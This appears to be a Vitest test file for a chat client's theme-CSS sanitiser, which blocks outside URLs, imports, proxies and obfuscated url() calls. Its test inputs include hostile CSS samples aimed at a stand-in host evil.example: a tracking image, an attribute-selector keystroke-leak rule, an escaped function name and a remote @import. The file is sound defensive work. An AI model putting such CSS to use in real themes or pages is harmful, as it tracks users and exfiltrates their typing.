// SPDX-License-Identifier: AGPL-3.0-or-later

import {gateThemeCss, REJECTED_CSS_URL} from '@app/features/theme/utils/ThemeCssUrlGate';
import {describe, expect, it} from 'vitest';

const MEDIA = 'https://media.example.com';
const ATTACHMENT = `${MEDIA}/attachments/123/456/pic.png`;
const OBJECT_URL = 'blob:https://chat.example.com/0b8f2a6e-1f2c-4c4e-9d55-1a2b3c4d5e6f';
const REJECTED = `url("${REJECTED_CSS_URL}")`;

function gate(css: string, objectUrls: ReadonlyArray<string> = []) {
	return gateThemeCss(css, {mediaEndpoint: MEDIA, objectUrls: new Set(objectUrls)});
}

describe('gateThemeCss', () => {
	it('replaces an outside image with an empty one and reports it', () => {
		const result = gate('.a { background: url(https://evil.example/track.png); }');
		expect(result.rejected).toBe(false);
		expect(result.css).toBe(`.a { background: ${REJECTED}; }`);
		expect(result.blocked).toEqual(['https://evil.example/track.png']);
	});

	it("blocks the media server's /external/ proxy, which a theme could use to report keystrokes", () => {
		const css = `input[value^="a"] { background: url("${MEDIA}/external/c2ln/https/evil.example/a"); }`;
		const result = gate(css);
		expect(result.css).toBe(`input[value^="a"] { background: ${REJECTED}; }`);
		expect(result.blocked).toEqual([`${MEDIA}/external/c2ln/https/evil.example/a`]);
	});

	it('keeps an attachment link on our media server, without its query', () => {
		const result = gate(`.a { background: url("${ATTACHMENT}?width=64"); }`);
		expect(result.css).toBe(`.a { background: url("${ATTACHMENT}"); }`);
		expect(result.blocked).toEqual([]);
	});

	it('blocks an attachment link on another host', () => {
		const result = gate('.a { background: url(https://other.example/attachments/123/456/pic.png); }');
		expect(result.css).toBe(`.a { background: ${REJECTED}; }`);
	});

	it("keeps only the theme's own blob: files", () => {
		expect(gate(`.a { background: url(${OBJECT_URL}); }`, [OBJECT_URL]).blocked).toEqual([]);
		expect(gate(`.a { background: url(${OBJECT_URL}); }`).blocked).toEqual([OBJECT_URL]);
	});

	it('keeps data: images and fonts, and blocks other data: types', () => {
		expect(gate('.a { background: url("data:image/png;base64,AAAA"); }').blocked).toEqual([]);
		expect(gate('.a { background: url("data:text/html,<b>x</b>"); }').blocked).toEqual(['data:text/html,<b>x</b>']);
	});

	it('drops @import rules except Google and coollabs font stylesheets', () => {
		const result = gate(
			'@import url("https://fonts.googleapis.com/css2?family=Inter");\n@import "https://evil.example/x.css";\n.a{}',
		);
		expect(result.css).toContain('@import url("https://fonts.googleapis.com/css2?family=Inter");');
		expect(result.css).not.toContain('evil.example');
		expect(result.blocked).toEqual(['https://evil.example/x.css']);
	});

	it('allows font files from Google Fonts only inside @font-face', () => {
		const font = 'https://fonts.gstatic.com/s/inter/v1/a.woff2';
		expect(gate(`@font-face { font-family: X; src: url(${font}); }`).blocked).toEqual([]);
		expect(gate(`.a { background: url(${font}); }`).blocked).toEqual([font]);
	});

	it('keeps #fragment references outside @font-face', () => {
		expect(gate('.a { mask: url(#mask); }').blocked).toEqual([]);
	});

	it('refuses a url function with a value it does not allow inside image-set', () => {
		const result = gate(`.a { background: image-set(url("${ATTACHMENT}") 1x, url("https://evil.example/b.png") 2x); }`);
		expect(result.css).toBe(`.a { background: ${REJECTED}; }`);
	});

	it('sees through escaped function names', () => {
		const result = gate('.a { background: u\\72l(https://evil.example/c.png); }');
		expect(result.css).toBe(`.a { background: ${REJECTED}; }`);
	});

	it('leaves broken CSS in a form that passes the gate unchanged a second time', () => {
		for (const css of [
			'.a { background: url("https://evil.example/d.png); }',
			'.a { background: url(https://evil.example/e.png',
			'@import "https://evil.example/f.css"\n.b { color: red }',
			'.c { background: image-set("data:image/png,A" 1x /* )',
			'.d { background: url(https://evil.example/g b) }',
		]) {
			const first = gate(css);
			expect(first.rejected, css).toBe(false);
			expect(first.css, css).not.toContain('evil.example');
			expect(gate(first.css), css).toEqual({css: first.css, rejected: false, blocked: []});
		}
	});

	it('leaves CSS without links unchanged', () => {
		const css = ':root { --accent: #ff00aa; }\n.message { color: var(--accent); }';
		expect(gate(css)).toEqual({css, rejected: false, blocked: []});
	});
});
